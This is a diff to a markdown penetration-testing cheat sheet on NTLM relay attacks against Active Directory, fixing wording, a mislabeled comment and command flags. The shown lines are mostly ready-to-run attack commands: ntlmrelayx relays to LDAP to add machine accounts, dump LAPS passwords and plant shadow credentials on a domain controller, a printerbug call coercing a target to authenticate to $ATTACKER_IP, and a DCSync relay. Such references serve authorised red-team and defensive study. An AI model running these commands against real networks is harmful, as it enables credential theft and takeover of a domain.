@@ -30,7 +30,7 @@ responder -I "eth0" -wP # WPAD + ProxyAuth
 
 ## MultiRelayX
 
-You can use NTLM hashes to use PtH attack by example or use `impacket-ntlmrelayx` in parallele of responder to relays NTLM session and use it directly.
+You can use captured NTLM hashes for a PtH attack, for example, or run `impacket-ntlmrelayx` in parallel with Responder to relay NTLM sessions and use them directly.
 
 Listing machines without SMB signin required
 
@@ -58,11 +58,11 @@ sudo ntlmrelayx.py -t https://mail.$DOMAIN/EWS/Exchange.asmx -smb2support --no-s
 # Create machine
 sudo ntlmrelayx.py -t ldap://$TARGET --add-computer SUPPORT$ -smb2support
 
-# DCSync
+# Dump LAPS passwords
 sudo ntlmrelayx.py -t ldap://$TARGET --dump-laps
 
 # Relay multi targets
-sudo ntlmrelayx.py -tf relay-targets.txt smb2support --no-http-server
+sudo ntlmrelayx.py -tf relay-targets.txt -smb2support --no-http-server
 
 # Shadow Credential (pyWhisker)
 sudo ntlmrelayx.py -t ldap://$TARGET --shadow-credentials --shadow-target 'DC01$'
@@ -76,7 +76,7 @@ sudo ntlmrelayx.py -t ldap://$TARGET --shadow-credentials --shadow-target 'DC01$
 python3 printerbug.py $DOMAIN/$USER:$PASSWORD@$TARGET_IP $ATTACKER_IP
 
 # On attacker machine
-sudo ntlmrelayx.py -t dcsync://$ATTACKER_IP --no-smb-server --no-http-server
+sudo ntlmrelayx.py -t dcsync://$DC_IP --no-smb-server --no-http-server
 ```
 
 #### PetitPotam
